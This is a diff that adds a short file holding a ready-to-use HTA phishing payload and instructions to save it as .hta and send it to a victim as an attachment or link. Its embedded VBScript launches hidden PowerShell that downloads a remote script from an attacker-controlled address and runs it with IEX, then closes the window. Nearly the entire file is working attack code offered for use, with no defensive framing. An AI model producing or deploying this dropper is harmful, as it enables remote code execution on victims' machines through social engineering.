@@ -1,0 +1,31 @@
+This file needs to be saved as an HTA file (.hta)
+This can be attached or sent as a link as well it will execute once the user allows it and will call a powershell code
+Copy and Paste the following code and save it.
+
+###############################################################################
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//ENhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/2020/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<title>Payload</title>
+<script language="VBScript">
+set oShell = CreateObject("Wscript.Shell")
+oShell.Run("powershell.exe -WindowStyle hidden -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/payload.ps1'));"),0,true
+self.close
+</script>
+<hta:application
+id="oHTA"
+applicationname=Payload
+application="yes"
+>
+</hta:application>
+</head>
+<div>
+<object type="text/html" data="One true gangsta" width="100%" height="100%">
+</object></div>
+<body>
+</body>
+</html>
+
+#############################################################################
